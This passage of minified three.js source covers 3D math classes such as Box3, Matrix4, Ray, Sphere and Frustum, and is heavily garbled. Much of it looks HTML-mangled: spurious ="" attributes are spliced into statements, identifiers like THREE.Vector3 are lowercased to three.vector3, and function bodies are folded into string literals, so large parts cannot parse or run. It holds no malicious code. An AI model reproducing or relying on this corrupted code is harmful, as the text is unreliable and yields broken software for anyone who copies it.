this},expandbyvector:function(a){this.min.sub(a);this.max.add(a);return=\"\" this},expandbyscalar:function(a){this.min.addscalar(-a);=\"\" this.max.addscalar(a);return=\"\" this},containspoint:function(a){return=\"\" a.x<this.min.x||a.x=\"\">this.max.x||a.y<this.min.y||a.y>this.max.y?!1:!0},containsBox:function(a){return this.min.x<=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y?!0:!1},getparameter:function(a,b){return(b||new three.vector2).set((a.x-this.min.x)=\"\" (this.max.x-this.min.x),(a.y-this.min.y)=\"\" (this.max.y-this.min.y))},intersectsbox:function(a){return=\"\" a.max.x<this.min.x||a.min.x=\"\">this.max.x||a.max.y<this.min.y||a.min.y>\nthis.max.y?!1:!0},clampPoint:function(a,b){return(b||new THREE.Vector2).copy(a).clamp(this.min,this.max)},distanceToPoint:function(){var a=new THREE.Vector2;return function(b){return a.copy(b).clamp(this.min,this.max).sub(b).length()}}(),intersect:function(a){this.min.max(a.min);this.max.min(a.max);return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},translate:function(a){this.min.add(a);this.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&\na.max.equals(this.max)}};THREE.Box3=function(a,b){this.min=void 0!==a?a:new THREE.Vector3(Infinity,Infinity,Infinity);this.max=void 0!==b?b:new THREE.Vector3(-Infinity,-Infinity,-Infinity)};\nTHREE.Box3.prototype={constructor:THREE.Box3,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromArray:function(a){for(var b=Infinity,c=Infinity,d=Infinity,e=-Infinity,f=-Infinity,g=-Infinity,h=0,k=a.length;h<k;h+=3){var l=\"a[h],n=a[h+1],p=a[h+2];l<b&&(b=l);n<c&&(c=n);p<d&&(d=p);l\">e&&(e=l);n>f&&(f=n);p>g&&(g=p)}this.min.set(b,c,d);this.max.set(e,f,g)},setFromPoints:function(a){this.makeEmpty();for(var b=0,c=a.length;b<c;b++)this.expandbypoint(a[b]);return this},setfromcenterandsize:function(){var=\"\" a=\"new\" three.vector3;return=\"\" function(b,c){var=\"\" d=\"a.copy(c).multiplyScalar(.5);this.min.copy(b).sub(d);this.max.copy(b).add(d);return\" this}}(),setfromobject:function(){var=\"\" function(b){var=\"\" c=\"this;b.updateMatrixWorld(!0);this.makeEmpty();b.traverse(function(b){var\" e=\"b.geometry;if(void\" 0!=\"=e)if(e\" instanceof=\"\" three.geometry)for(var=\"\" f=\"e.vertices,e=0,g=f.length;e<g;e++)a.copy(f[e]),a.applyMatrix4(b.matrixWorld),c.expandByPoint(a);else\" if(e=\"\" three.buffergeometry&&void=\"\" e.attributes.position)for(f=\"e.attributes.position.array,e=0,g=f.length;e<g;e+=3)a.fromArray(f,e),a.applyMatrix4(b.matrixWorld),c.expandByPoint(a)});return\" this}}(),clone:function(){return(new=\"\" this.constructor).copy(this)},copy:function(a){this.min.copy(a.min);this.max.copy(a.max);return=\"\" this},makeempty:function(){this.min.x=\"this.min.y=this.min.z=Infinity;this.max.x=this.max.y=this.max.z=-Infinity;return\" this},isempty:function(){return=\"\" this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z},=\"\" center:function(a){return(a||new=\"\" three.vector3).addvectors(this.min,this.max).multiplyscalar(.5)},size:function(a){return(a||new=\"\" three.vector3).subvectors(this.max,this.min)},expandbypoint:function(a){this.min.min(a);this.max.max(a);return=\"\" this},expandbyvector:function(a){this.min.sub(a);this.max.add(a);return=\"\" this},expandbyscalar:function(a){this.min.addscalar(-a);this.max.addscalar(a);return=\"\" this},containspoint:function(a){return=\"\" a.x<this.min.x||a.x=\"\">this.max.x||a.y<this.min.y||a.y>this.max.y||a.z<\nthis.min.z||a.z>this.max.z?!1:!0},containsBox:function(a){return this.min.x<=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y&&this.min.z<=a.min.z&&a.max.z<=this.max.z?!0:!1},getparameter:function(a,b){return(b||new three.vector3).set((a.x-this.min.x)=\"\" (this.max.x-this.min.x),(a.y-this.min.y)=\"\" (this.max.y-this.min.y),(a.z-this.min.z)=\"\" (this.max.z-this.min.z))},intersectsbox:function(a){return=\"\" a.max.x<this.min.x||a.min.x=\"\">this.max.x||a.max.y<this.min.y||a.min.y>this.max.y||a.max.z<\nthis.min.z||a.min.z>this.max.z?!1:!0},intersectsSphere:function(){var a;return function(b){void 0===a&&(a=new THREE.Vector3);this.clampPoint(b.center,a);return a.distanceToSquared(b.center)<=b.radius*b.radius}}(),intersectsplane:function(a){var b,c;0<a.normal.x?(b=\"a.normal.x*this.min.x,c=a.normal.x*this.max.x):(b=a.normal.x*this.max.x,c=a.normal.x*this.min.x);0<a.normal.y?(b+=a.normal.y*this.min.y,c+=a.normal.y*this.max.y):(b+=a.normal.y*this.max.y,c+=a.normal.y*this.min.y);0<a.normal.z?(b+=a.normal.z*\" this.min.z,c+=\"a.normal.z*this.max.z):(b+=a.normal.z*this.max.z,c+=a.normal.z*this.min.z);return\" b<=\"a.constant&&c\">=a.constant},clampPoint:function(a,b){return(b||new THREE.Vector3).copy(a).clamp(this.min,this.max)},distanceToPoint:function(){var a=new THREE.Vector3;return function(b){return a.copy(b).clamp(this.min,this.max).sub(b).length()}}(),getBoundingSphere:function(){var a=new THREE.Vector3;return function(b){b=b||new THREE.Sphere;b.center=this.center();b.radius=.5*this.size(a).length();return b}}(),\nintersect:function(a){this.min.max(a.min);this.max.min(a.max);this.isEmpty()&&this.makeEmpty();return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},applyMatrix4:function(){var a=[new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3];return function(b){if(this.isEmpty())return this;a[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(b);a[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(b);\na[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(b);a[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(b);a[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(b);a[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(b);a[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(b);a[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(b);this.setFromPoints(a);return this}}(),translate:function(a){this.min.add(a);this.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&\na.max.equals(this.max)}};THREE.Matrix3=function(){this.elements=new Float32Array([1,0,0,0,1,0,0,0,1]);0<arguments.length&&console.error(\"three.matrix3: 0=\"==a&&(a=new\" the=\"\" constructor=\"\" no=\"\" longer=\"\" reads=\"\" arguments.=\"\" use=\"\" .set()=\"\" instead.\")};=\"\" three.matrix3.prototype=\"{constructor:THREE.Matrix3,set:function(a,b,c,d,e,f,g,h,k){var\" l=\"this.elements;l[0]=a;l[1]=d;l[2]=g;l[3]=b;l[4]=e;l[5]=h;l[6]=c;l[7]=f;l[8]=k;return\" this},identity:function(){this.set(1,0,0,0,1,0,0,0,1);return=\"\" this},clone:function(){return(new=\"\" this.constructor).fromarray(this.elements)},copy:function(a){a=\"a.elements;this.set(a[0],a[3],a[6],a[1],a[4],a[7],a[2],a[5],a[8]);return\" this},setfrommatrix4:function(a){a=\"a.elements;this.set(a[0],a[4],a[8],a[1],a[5],a[9],a[2],a[6],a[10]);\" return=\"\" this},applytovector3array:function(){var=\"\" a;return=\"\" function(b,c,d){void=\"\" three.vector3);void=\"\" e=\"0;e<d;e+=3,c+=3)a.fromArray(b,c),a.applyMatrix3(this),a.toArray(b,c);return\" b}}(),applytobuffer:function(){var=\"\" b}}(),=\"\" multiplyscalar:function(a){var=\"\" b=\"this.elements;b[0]*=a;b[3]*=a;b[6]*=a;b[1]*=a;b[4]*=a;b[7]*=a;b[2]*=a;b[5]*=a;b[8]*=a;return\" this},determinant:function(){var=\"\" a=\"this.elements,b=a[0],c=a[1],d=a[2],e=a[3],f=a[4],g=a[5],h=a[6],k=a[7],a=a[8];return\" b*f*a-b*g*k-c*e*a+c*g*h+d*e*k-d*f*h},getinverse:function(a,b){a=\"\" instanceof=\"\" three.matrix4&&console.error(\"three.matrix3.getinverse=\"\" takes=\"\" matrix4=\"\" argument.\");var=\"\" c=\"a.elements,d=this.elements,e=c[0],f=c[1],g=c[2],h=c[3],k=c[4],l=c[5],n=c[6],p=c[7],\" error(\"three.matrix3.getinverse():=\"\" can't=\"\" invert=\"\" matrix,=\"\" determinant=\"\" is=\"\" 0\");console.warn(\"three.matrix3.getinverse():=\"\" 0\");return=\"\" this.identity()}s=\"1/s;d[0]=m*s;d[1]=(g*p-c*f)*s;d[2]=(l*f-g*k)*s;d[3]=q*s;d[4]=(c*e-g*n)*s;d[5]=(g*h-l*e)*s;d[6]=r*s;d[7]=(f*n-p*e)*s;d[8]=(k*e-f*h)*s;return\" this},transpose:function(){var=\"\" a,b=\"this.elements;a=b[1];b[1]=b[3];b[3]=a;a=b[2];b[2]=b[6];b[6]=a;a=b[5];b[5]=\" b[7];b[7]=\"a;return\" this},flattentoarrayoffset:function(a,b){console.warn(\"three.matrix3:=\"\" .flattentoarrayoffset=\"\" deprecated=\"\" -=\"\" just=\"\" .toarray=\"\" instead.\");return=\"\" this.toarray(a,b)},getnormalmatrix:function(a){return=\"\" this.setfrommatrix4(a).getinverse(this).transpose()},transposeintoarray:function(a){var=\"\" this},fromarray:function(a){this.elements.set(a);return=\"\" this},toarray:function(a,b){void=\"\" a&&(a=\"[]);void\" a}};three.matrix4=\"function(){this.elements=new\" float32array([1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1]);0<arguments.length&&console.error(\"three.matrix4:=\"\" three.matrix4.prototype=\"{constructor:THREE.Matrix4,set:function(a,b,c,d,e,f,g,h,k,l,n,p,m,q,r,s){var\" t=\"this.elements;t[0]=a;t[4]=b;t[8]=c;t[12]=d;t[1]=e;t[5]=f;t[9]=g;t[13]=h;t[2]=k;t[6]=l;t[10]=n;t[14]=p;t[3]=m;t[7]=q;t[11]=r;t[15]=s;return\" this},identity:function(){this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1);return=\"\" three.matrix4).fromarray(this.elements)},copy:function(a){this.elements.set(a.elements);return=\"\" this},copyposition:function(a){var=\"\" b[12]=\"a[12];b[13]=a[13];b[14]=a[14];return\" this},extractbasis:function(a,b,c){a.setfrommatrixcolumn(this,0);b.setfrommatrixcolumn(this,1);c.setfrommatrixcolumn(this,2);return=\"\" this},makebasis:function(a,b,c){this.set(a.x,b.x,c.x,0,a.y,b.y,c.y,0,a.z,b.z,c.z,0,0,0,0,1);return=\"\" this},extractrotation:function(){var=\"\" function(b){void=\"\" three.vector3);var=\"\" 2).length();c[0]=\"d[0]*e;c[1]=d[1]*e;c[2]=d[2]*e;c[4]=d[4]*f;c[5]=d[5]*f;c[6]=d[6]*f;c[8]=d[8]*b;c[9]=d[9]*b;c[10]=d[10]*b;return\" this}}(),makerotationfromeuler:function(a){!1=\"==a\" three.euler&&console.error(\"three.matrix:=\"\" .makerotationfromeuler()=\"\" now=\"\" expects=\"\" euler=\"\" rotation=\"\" rather=\"\" than=\"\" vector3=\"\" and=\"\" order.\");var=\"\" k=\"f*e,l=c*h,n=c*e;b[0]=g*h;b[4]=\" -g*e;b[8]=\"d;b[1]=k+l*d;b[5]=a-n*d;b[9]=-c*g;b[2]=n-a*d;b[6]=l+k*d;b[10]=f*g}else\"YXZ\"===a.order?(a=g*h,k=g*e,l=d*h,n=d*e,b[0]=a+n*c,b[4]=l*c-k,b[8]=f*d,b[1]=f*e,b[5]=f*h,b[9]=-c,b[2]=k*c-l,b[6]=n+a*c,b[10]=f*g):\"ZXY\"===a.order?(a=g*h,k=g*e,l=d*h,n=d*e,b[0]=a-n*c,b[4]=-f*e,b[8]=l+k*c,b[1]=k+l*c,b[5]=f*h,b[9]=n-a*c,b[2]=-f*d,b[6]=c,b[10]=f*g):\"ZYX\"===a.order?(a=f*h,k=f*e,l=c*h,n=c*e,b[0]=g*h,b[4]=l*d-k,b[8]=a*d+n,b[1]=g*e,b[5]=n*d+a,b[9]=k*d-l,b[2]=-d,b[6]=c*g,b[10]=f*g):\"YZX\"===a.order?(a=f*g,k=f*\" d,l=\"c*g,n=c*d,b[0]=g*h,b[4]=n-a*e,b[8]=l*e+k,b[1]=e,b[5]=f*h,b[9]=-c*h,b[2]=-d*h,b[6]=k*e+l,b[10]=a-n*e):\"XZY\"===a.order&&(a=f*g,k=f*d,l=c*g,n=c*d,b[0]=g*h,b[4]=-e,b[8]=d*h,b[1]=a*e+n,b[5]=f*h,b[9]=k*e-l,b[2]=l*e-k,b[6]=c*h,b[10]=n*e+a);b[3]=0;b[7]=0;b[11]=0;b[12]=0;b[13]=0;b[14]=0;b[15]=1;return\" this},makerotationfromquaternion:function(a){var=\"\" f;b[5]=\"1-(a+e);b[9]=d-g;b[2]=c-h;b[6]=d+g;b[10]=1-(a+n);b[3]=0;b[7]=0;b[11]=0;b[12]=0;b[13]=0;b[14]=0;b[15]=1;return\" this},lookat:function(){var=\"\" a,b,c;return=\"\" function(d,e,f){void=\"\" three.vector3,b=\"new\" three.vector3,c=\"new\" g=\"this.elements;c.subVectors(d,e).normalize();0===c.lengthSq()&&(c.z=1);a.crossVectors(f,c).normalize();0===a.lengthSq()&&(c.z+=1E-4,a.crossVectors(f,c).normalize());b.crossVectors(c,a);g[0]=a.x;g[4]=b.x;g[8]=c.x;g[1]=a.y;g[5]=b.y;g[9]=c.y;g[2]=a.z;\" g[6]=\"b.z;g[10]=c.z;return\" this}}(),multiply:function(a,b){return=\"\" void=\"\" 0!=\"=b?(console.warn(\"THREE.Matrix4:\" .multiply()=\"\" only=\"\" accepts=\"\" one=\"\" argument.=\"\" .multiplymatrices(=\"\" a,=\"\" )=\"\" instead.\"),this.multiplymatrices(a,b)):this.multiplymatrices(this,a)},premultiply:function(a){return=\"\" this.multiplymatrices(a,this)},multiplymatrices:function(a,b){var=\"\" w=\"d[0],E=d[4],z=d[8],y=d[12],A=d[1],I=d[5],B=d[9],F=d[13],K=d[2],P=d[6],M=d[10],H=d[14],L=d[3],O=d[7],N=d[11],d=d[15];e[0]=f*w+g*A+h*K+k*L;e[4]=f*E+g*I+h*P+k*O;e[8]=f*z+g*B+h*M+k*N;e[12]=f*y+g*F+h*H+k*d;e[1]=l*w+n*A+p*K+m*L;e[5]=l*E+n*I+p*P+m*O;e[9]=l*z+n*B+p*M+m*N;e[13]=l*y+n*F+p*H+m*d;e[2]=q*w+r*A+s*K+t*L;e[6]=q*E+r*I+s*P+t*O;e[10]=q*z+r*B+s*M+t*N;e[14]=q*y+r*F+s*H+t*d;e[3]=u*w+v*A+C*K+c*L;e[7]=u*E+v*I+C*P+c*O;e[11]=u*z+v*B+C*M+c*N;e[15]=u*y+v*F+C*H+c*d;return\" this},multiplytoarray:function(a,b,=\"\" c){var=\"\" d=\"this.elements;this.multiplyMatrices(a,b);c[0]=d[0];c[1]=d[1];c[2]=d[2];c[3]=d[3];c[4]=d[4];c[5]=d[5];c[6]=d[6];c[7]=d[7];c[8]=d[8];c[9]=d[9];c[10]=d[10];c[11]=d[11];c[12]=d[12];c[13]=d[13];c[14]=d[14];c[15]=d[15];return\" this},multiplyscalar:function(a){var=\"\" (a=\"new\" b}}(),determinant:function(){var=\"\" a[5],h=\"a[9],k=a[13],l=a[2],n=a[6],p=a[10],m=a[14];return\" a[3]*(+e*h*n-d*k*n-e*g*p+c*k*p+d*g*m-c*h*m)+a[7]*(+b*h*m-b*k*p+e*f*p-d*f*m+d*k*l-e*h*l)+a[11]*(+b*k*n-b*g*m-e*f*n+c*f*m+e*g*l-c*k*l)+a[15]*(-d*g*l-b*h*n+b*g*p+d*f*n-c*f*p+c*h*l)},transpose:function(){var=\"\" instead.\");=\"\" this.toarray(a,b)},getposition:function(){var=\"\" function(){void=\"\" three.vector3);console.warn(\"three.matrix4:=\"\" .getposition()=\"\" has=\"\" been=\"\" removed.=\"\" vector3.setfrommatrixposition(=\"\" matrix=\"\" a.setfrommatrixcolumn(this,3)}}(),setposition:function(a){var=\"\" this},getinverse:function(a,b){var=\"\" u=\"d[13],v=d[14],d=d[15],C=q*v*p-u*r*p+u*n*s-l*v*s-q*n*d+l*r*d,w=t*r*p-m*v*p-t*n*s+k*v*s+m*n*d-k*r*d,E=m*u*p-t*q*p+t*l*s-k*u*s-m*l*d+k*q*d,z=t*q*n-m*u*n-t*l*r+k*u*r+m*l*v-k*q*v,y=e*C+f*w+g*E+h*z;if(0===y){if(b)throw\" error(\"three.matrix4.getinverse():=\"\" 0\");console.warn(\"three.matrix4.getinverse():=\"\" this.identity()}y=\"1/y;c[0]=C*y;c[1]=(u*r*h-q*v*h-u*g*s+f*v*s+q*g*d-f*r*d)*y;c[2]=(l*v*h-u*n*h+u*g*p-f*v*p-l*g*d+f*n*d)*y;c[3]=\" (q*n*h-l*r*h-q*g*p+f*r*p+l*g*s-f*n*s)*y;c[4]=\"w*y;c[5]=(m*v*h-t*r*h+t*g*s-e*v*s-m*g*d+e*r*d)*y;c[6]=(t*n*h-k*v*h-t*g*p+e*v*p+k*g*d-e*n*d)*y;c[7]=(k*r*h-m*n*h+m*g*p-e*r*p-k*g*s+e*n*s)*y;c[8]=E*y;c[9]=(t*q*h-m*u*h-t*f*s+e*u*s+m*f*d-e*q*d)*y;c[10]=(k*u*h-t*l*h+t*f*p-e*u*p-k*f*d+e*l*d)*y;c[11]=(m*l*h-k*q*h-m*f*p+e*q*p+k*f*s-e*l*s)*y;c[12]=z*y;c[13]=(m*u*g-t*q*g+t*f*r-e*u*r-m*f*v+e*q*v)*y;c[14]=(t*l*g-k*u*g-t*f*n+e*u*n+k*f*v-e*l*v)*y;c[15]=(k*q*g-m*l*g+m*f*n-e*q*n-k*f*r+e*l*r)*y;return\" this},scale:function(a){var=\"\" this},getmaxscaleonaxis:function(){var=\"\" math.sqrt(math.max(a[0]*a[0]+a[1]*a[1]+a[2]*a[2],a[4]*a[4]+a[5]*a[5]+a[6]*a[6],a[8]*a[8]+a[9]*a[9]+a[10]*a[10]))},maketranslation:function(a,b,c){this.set(1,0,0,a,0,1,0,b,0,0,1,c,0,0,0,1);return=\"\" this},makerotationx:function(a){var=\"\" this},makerotationy:function(a){var=\"\" this},makerotationz:function(a){var=\"\" this},makerotationaxis:function(a,b){var=\"\" this},makescale:function(a,b,c){this.set(a,0,0,0,0,b,0,0,0,0,c,=\"\" 0,0,0,0,1);return=\"\" this},compose:function(a,b,c){this.makerotationfromquaternion(b);this.scale(c);this.setposition(a);return=\"\" this},decompose:function(){var=\"\" a,b;return=\"\" function(c,d,e){void=\"\" three.matrix4);var=\"\" f=\"this.elements,g=a.set(f[0],f[1],f[2]).length(),h=a.set(f[4],f[5],f[6]).length(),k=a.set(f[8],f[9],f[10]).length();0\">this.determinant()&&(g=-g);c.x=f[12];c.y=f[13];c.z=f[14];b.elements.set(this.elements);c=1/g;var f=1/h,l=1/k;b.elements[0]*=c;b.elements[1]*=c;\nb.elements[2]*=c;b.elements[4]*=f;b.elements[5]*=f;b.elements[6]*=f;b.elements[8]*=l;b.elements[9]*=l;b.elements[10]*=l;d.setFromRotationMatrix(b);e.x=g;e.y=h;e.z=k;return this}}(),makeFrustum:function(a,b,c,d,e,f){var g=this.elements;g[0]=2*e/(b-a);g[4]=0;g[8]=(b+a)/(b-a);g[12]=0;g[1]=0;g[5]=2*e/(d-c);g[9]=(d+c)/(d-c);g[13]=0;g[2]=0;g[6]=0;g[10]=-(f+e)/(f-e);g[14]=-2*f*e/(f-e);g[3]=0;g[7]=0;g[11]=-1;g[15]=0;return this},makePerspective:function(a,b,c,d){a=c*Math.tan(THREE.Math.DEG2RAD*a*.5);var e=\n-a;return this.makeFrustum(e*b,a*b,e,a,c,d)},makeOrthographic:function(a,b,c,d,e,f){var g=this.elements,h=1/(b-a),k=1/(c-d),l=1/(f-e);g[0]=2*h;g[4]=0;g[8]=0;g[12]=-((b+a)*h);g[1]=0;g[5]=2*k;g[9]=0;g[13]=-((c+d)*k);g[2]=0;g[6]=0;g[10]=-2*l;g[14]=-((f+e)*l);g[3]=0;g[7]=0;g[11]=0;g[15]=1;return this},equals:function(a){var b=this.elements;a=a.elements;for(var c=0;16>c;c++)if(b[c]!==a[c])return!1;return!0},fromArray:function(a){this.elements.set(a);return this},toArray:function(a,b){void 0===a&&(a=[]);\nvoid 0===b&&(b=0);var c=this.elements;a[b]=c[0];a[b+1]=c[1];a[b+2]=c[2];a[b+3]=c[3];a[b+4]=c[4];a[b+5]=c[5];a[b+6]=c[6];a[b+7]=c[7];a[b+8]=c[8];a[b+9]=c[9];a[b+10]=c[10];a[b+11]=c[11];a[b+12]=c[12];a[b+13]=c[13];a[b+14]=c[14];a[b+15]=c[15];return a}};THREE.Ray=function(a,b){this.origin=void 0!==a?a:new THREE.Vector3;this.direction=void 0!==b?b:new THREE.Vector3};\nTHREE.Ray.prototype={constructor:THREE.Ray,set:function(a,b){this.origin.copy(a);this.direction.copy(b);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.origin.copy(a.origin);this.direction.copy(a.direction);return this},at:function(a,b){return(b||new THREE.Vector3).copy(this.direction).multiplyScalar(a).add(this.origin)},lookAt:function(a){this.direction.copy(a).sub(this.origin).normalize();return this},recast:function(){var a=new THREE.Vector3;return function(b){this.origin.copy(this.at(b,\na));return this}}(),closestPointToPoint:function(a,b){var c=b||new THREE.Vector3;c.subVectors(a,this.origin);var d=c.dot(this.direction);return 0>d?c.copy(this.origin):c.copy(this.direction).multiplyScalar(d).add(this.origin)},distanceToPoint:function(a){return Math.sqrt(this.distanceSqToPoint(a))},distanceSqToPoint:function(){var a=new THREE.Vector3;return function(b){var c=a.subVectors(b,this.origin).dot(this.direction);if(0>c)return this.origin.distanceToSquared(b);a.copy(this.direction).multiplyScalar(c).add(this.origin);\nreturn a.distanceToSquared(b)}}(),distanceSqToSegment:function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3;return function(d,e,f,g){a.copy(d).add(e).multiplyScalar(.5);b.copy(e).sub(d).normalize();c.copy(this.origin).sub(a);var h=.5*d.distanceTo(e),k=-this.direction.dot(b),l=c.dot(this.direction),n=-c.dot(b),p=c.lengthSq(),m=Math.abs(1-k*k),q;0<m?(d=k*n-l,e=k*l-n,q=h*m,0<=d?e>=-q?e<=q?(h=1 m,d*=\"h,e*=h,k=d*(d+k*e+2*l)+e*(k*d+e+2*n)+p):(e=h,d=Math.max(0,-(k*e+l)),k=-d*d+e*(e+2*\" n)+p):(e=\"-h,d=Math.max(0,-(k*e+l)),k=-d*d+e*(e+2*n)+p):e<=-q?(d=Math.max(0,-(-k*h+l)),e=0<d?-h:Math.min(Math.max(-h,-n),h),k=-d*d+e*(e+2*n)+p):e<=q?(d=0,e=Math.min(Math.max(-h,-n),h),k=e*(e+2*n)+p):(d=Math.max(0,-(k*h+l)),e=0<d?h:Math.min(Math.max(-h,-n),h),k=-d*d+e*(e+2*n)+p)):(e=0<k?-h:h,d=Math.max(0,-(k*e+l)),k=-d*d+e*(e+2*n)+p);f&&f.copy(this.direction).multiplyScalar(d).add(this.origin);g&&g.copy(b).multiplyScalar(e).add(a);return\" k}}(),intersectsphere:function(){var=\"\" a=\"new\" three.vector3;return=\"\" function(b,=\"\" c){a.subvectors(b.center,this.origin);var=\"\" d=\"a.dot(this.direction),e=a.dot(a)-d*d,f=b.radius*b.radius;if(e\">f)return null;f=Math.sqrt(f-e);e=d-f;d+=f;return 0>e&&0>d?null:0>e?this.at(d,c):this.at(e,c)}}(),intersectsSphere:function(a){return this.distanceToPoint(a.center)<=a.radius},distancetoplane:function(a){var 0=\"==a.distanceToPoint(this.origin)?0:null;a=-(this.origin.dot(a.normal)+a.constant)/b;return\" b=\"a.normal.dot(this.direction);if(0===b)return\" 0<=\"a?a:null},intersectPlane:function(a,b){var\" c=\"this.distanceToPlane(a);return\" null=\"==c?null:this.at(c,b)},intersectsPlane:function(a){var\">a.normal.dot(this.direction)*b?!0:!1},intersectBox:function(a,b){var c,d,e,f,g;d=1/this.direction.x;f=1/this.direction.y;g=1/this.direction.z;var h=this.origin;0<=d?(c=(a.min.x-h.x)*d,d*=a.max.x-h.x):(c=(a.max.x-h.x)*d,d*=a.min.x-h.x);0<=f?(e=(a.min.y-h.y)*f,f*=a.max.y-h.y):(e=(a.max.y-h.y)*f,f*=a.min.y-h.y);if(c>f||e>d)return null;if(e>c||c!==c)c=e;if(f<d||d!== d)d=\"f;0<=g?(e=(a.min.z-h.z)*g,g*=a.max.z-h.z):(e=(a.max.z-h.z)*g,g*=a.min.z-h.z);if(c\">g||e>d)return null;if(e>c||c!==c)c=e;if(g<d||d!==d)d=g;return 0=\"\">d?null:this.at(0<=c?c:d,b)},intersectsbox:function(){var a=\"new\" three.vector3;return=\"\" function(b){return=\"\" null!=\"=this.intersectBox(b,a)}}(),intersectTriangle:function(){var\" three.vector3,b=\"new\" three.vector3,c=\"new\" three.vector3,d=\"new\" function(e,f,g,h,k){b.subvectors(f,e);c.subvectors(g,e);d.crossvectors(b,c);f=\"this.direction.dot(d);\" if(0<f){if(h)return=\"\" null;h=\"1}else\" if(0=\"\">f)h=-1,f=-f;else return null;a.subVectors(this.origin,e);e=h*this.direction.dot(c.crossVectors(a,c));if(0>e)return null;g=h*this.direction.dot(b.cross(a));if(0>g||e+g>f)return null;e=-h*a.dot(d);return 0>e?null:this.at(e/f,k)}}(),applyMatrix4:function(a){this.direction.add(this.origin).applyMatrix4(a);this.origin.applyMatrix4(a);this.direction.sub(this.origin);this.direction.normalize();return this},equals:function(a){return a.origin.equals(this.origin)&&a.direction.equals(this.direction)}};\nTHREE.Sphere=function(a,b){this.center=void 0!==a?a:new THREE.Vector3;this.radius=void 0!==b?b:0};\nTHREE.Sphere.prototype={constructor:THREE.Sphere,set:function(a,b){this.center.copy(a);this.radius=b;return this},setFromPoints:function(){var a=new THREE.Box3;return function(b,c){var d=this.center;void 0!==c?d.copy(c):a.setFromPoints(b).center(d);for(var e=0,f=0,g=b.length;f<g;f++)e=math.max(e,d.distancetosquared(b[f]));this.radius=math.sqrt(e);return 0=\"\" this}}(),clone:function(){return(new=\"\" this.constructor).copy(this)},copy:function(a){this.center.copy(a.center);this.radius=\"a.radius;return\" this},=\"\" empty:function(){return=\"\">=this.radius},containsPoint:function(a){return a.distanceToSquared(this.center)<=this.radius*this.radius},distancetopoint:function(a){return a.distanceto(this.center)-this.radius},intersectssphere:function(a){var=\"\" b=\"this.radius+a.radius;return\" a.center.distancetosquared(this.center)<=\"b*b},intersectsBox:function(a){return\" a.intersectssphere(this)},intersectsplane:function(a){return=\"\" math.abs(this.center.dot(a.normal)-a.constant)<=\"this.radius},clampPoint:function(a,b){var\" c=\"this.center.distanceToSquared(a),d=b||new\" three.vector3;d.copy(a);c=\"\">this.radius*this.radius&&(d.sub(this.center).normalize(),d.multiplyScalar(this.radius).add(this.center));return d},getBoundingBox:function(a){a=a||new THREE.Box3;a.set(this.center,this.center);a.expandByScalar(this.radius);return a},applyMatrix4:function(a){this.center.applyMatrix4(a);this.radius*=a.getMaxScaleOnAxis();return this},translate:function(a){this.center.add(a);return this},equals:function(a){return a.center.equals(this.center)&&\na.radius===this.radius}};THREE.Frustum=function(a,b,c,d,e,f){this.planes=[void 0!==a?a:new THREE.Plane,void 0!==b?b:new THREE.Plane,void 0!==c?c:new THREE.Plane,void 0!==d?d:new THREE.Plane,void 0!==e?e:new THREE.Plane,void 0!==f?f:new THREE.Plane]};\nTHREE.Frustum.prototype={constructor:THREE.Frustum,set:function(a,b,c,d,e,f){var g=this.planes;g[0].copy(a);g[1].copy(b);g[2].copy(c);g[3].copy(d);g[4].copy(e);g[5].copy(f);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){for(var b=this.planes,c=0;6>c;c++)b[c].copy(a.planes[c]);return this},setFromMatrix:function(a){var b=this.planes,c=a.elements;a=c[0];var d=c[1],e=c[2],f=c[3],g=c[4],h=c[5],k=c[6],l=c[7],n=c[8],p=c[9],m=c[10],q=c[11],r=c[12],s=c[13],t=c[14],\nc=c[15];b[0].setComponents(f-a,l-g,q-n,c-r).normalize();b[1].setComponents(f+a,l+g,q+n,c+r).normalize();b[2].setComponents(f+d,l+h,q+p,c+s).normalize();b[3].setComponents(f-d,l-h,q-p,c-s).normalize();b[4].setComponents(f-e,l-k,q-m,c-t).normalize();b[5].setComponents(f+e,l+k,q+m,c+t).normalize();return this},intersectsObject:function(){var a=new THREE.Sphere;return function(b){var c=b.geometry;null===c.boundingSphere&&c.computeBoundingSphere();a.copy(c.boundingSphere).applyMatrix4(b.matrixWorld);return this.intersectsSphere(a)}}(),\nintersectsSprite:function(){var a=new THREE.Sphere;return function(b){a.center.set(0,0,0);a.radius=.7071067811865476;a.applyMatrix4(b.matrixWorld);return this.intersectsSphere(a)}}(),intersectsSphere:function(a){var b=this.planes,c=a.center;a=-a.radius;for(var d=0;6>d;d++)if(b[d].distanceToPoint(c)<a)return!1;return!0},intersectsbox:function(){var a=\"new\" three.vector3,b=\"new\" three.vector3;return=\"\" function(c){for(var=\"\" d=\"this.planes,e=0;6\">e;e++){var f=d[e];a.x=0<f.normal.x?c.min.x:c.max.x;b.x=0<f.normal.x? c.max.x:c.min.x;a.y=\"0<f.normal.y?c.min.y:c.max.y;b.y=0<f.normal.y?c.max.y:c.min.y;a.z=0<f.normal.z?c.min.z:c.max.z;b.z=0<f.normal.z?c.max.z:c.min.z;var\" g=\"f.distanceToPoint(a),f=f.distanceToPoint(b);if(0\">g&&0>f)return!1}return!0}}(),containsPoint:function(a){for(var 